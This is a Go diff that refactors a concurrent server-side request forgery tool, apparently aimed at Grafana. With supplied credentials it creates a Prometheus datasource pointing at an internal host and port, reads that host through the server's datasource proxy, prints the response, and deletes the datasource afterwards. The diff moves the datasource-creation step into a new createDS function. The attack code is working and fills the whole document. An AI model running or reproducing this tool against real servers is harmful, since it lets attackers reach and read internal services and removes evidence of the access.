@@ -82,48 +82,11 @@ func makeSsrfRequest(wg *sync.WaitGroup, sem chan struct{}, flags map[string]str
 		Timeout: time.Duration(timeout) * time.Second,
 	}
 
-	url := fmt.Sprintf("http://%s:%s@%s:%s/api/datasources", flags["user"], flags["password"], target, defport)
-
-	payload := map[string]any{
-		"name":     utils.RandStringRunes(5),
-		"type":     "prometheus",
-		"access":   "proxy",
-		"url":      fmt.Sprintf("http://%s:%s", ssrfTarget, flags["ssrf-port"]),
-		"jsonData": map[string]any{},
-	}
-
-	payloadBytes, err := json.Marshal(payload)
+	dsID, err := createDS(flags, target, defport, client, ssrfTarget)
 	if err != nil {
-		fmt.Println(err)
+		utils.Colorize(utils.ColorRed, fmt.Sprintf("Can't create datasource%v", err))
 		return
 	}
-
-	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(payloadBytes))
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	req.Header.Set("Content-Type", "application/json")
-
-	resp, err := client.Do(req)
-	if err != nil {
-		// fmt.Println(err)
-		return
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode >= 300 {
-		body, _ := io.ReadAll(resp.Body)
-		utils.Colorize(utils.ColorRed, fmt.Sprintf("[!] %s:%s - %d %s", target, defport, resp.StatusCode, string(body)))
-		return
-	}
-
-	var createResp Ssrf
-	if err := json.NewDecoder(resp.Body).Decode(&createResp); err != nil {
-		fmt.Printf("Can't get Datasource creation response: %v\n", err)
-		return
-	}
-	dsID := createResp.ID
 
 	proxyURL := fmt.Sprintf("http://%s:%s@%s:%s/api/datasources/proxy/%d", flags["user"], flags["password"], target, defport, dsID)
 	proxyReq, err := http.NewRequest(http.MethodGet, proxyURL, nil)
@@ -141,10 +104,59 @@ func makeSsrfRequest(wg *sync.WaitGroup, sem chan struct{}, flags map[string]str
 	defer proxyResp.Body.Close()
 
 	body, _ := io.ReadAll(proxyResp.Body)
-	utils.Colorize(utils.ColorYellow, fmt.Sprintf("[+] %s - %s", ssrfTarget, string(body)))
+	if body != nil {
+		utils.Colorize(utils.ColorYellow, fmt.Sprintf("[+] %s - %s", ssrfTarget, string(body)))
+	}
 
 	deleteDS(flags, target, defport, client, dsID)
 
+}
+
+func createDS(flags map[string]string, target string, port string, client http.Client, ssrfTarget string) (int, error) {
+	url := fmt.Sprintf("http://%s:%s@%s:%s/api/datasources", flags["user"], flags["password"], target, port)
+
+	payload := map[string]any{
+		"name":     utils.RandStringRunes(10),
+		"type":     "prometheus",
+		"access":   "proxy",
+		"url":      fmt.Sprintf("http://%s:%s", ssrfTarget, flags["ssrf-port"]),
+		"jsonData": map[string]any{},
+	}
+
+	payloadBytes, err := json.Marshal(payload)
+	if err != nil {
+		fmt.Println(err)
+		return 0, err
+	}
+
+	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(payloadBytes))
+	if err != nil {
+		fmt.Println(err)
+		return 0, err
+	}
+	req.Header.Set("Content-Type", "application/json")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		// fmt.Println(err)
+		return 0, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode >= 300 {
+		body, _ := io.ReadAll(resp.Body)
+		utils.Colorize(utils.ColorRed, fmt.Sprintf("[!] %s:%s - %d %s", target, port, resp.StatusCode, string(body)))
+		return 0, fmt.Errorf("")
+	}
+
+	var createResp Ssrf
+	if err := json.NewDecoder(resp.Body).Decode(&createResp); err != nil {
+		fmt.Printf("Can't get Datasource creation response: %v\n", err)
+		return 0, err
+	}
+	dsID := createResp.ID
+
+	return dsID, nil
 }
 
 func deleteDS(flags map[string]string, target string, port string, client http.Client, dsID int) {
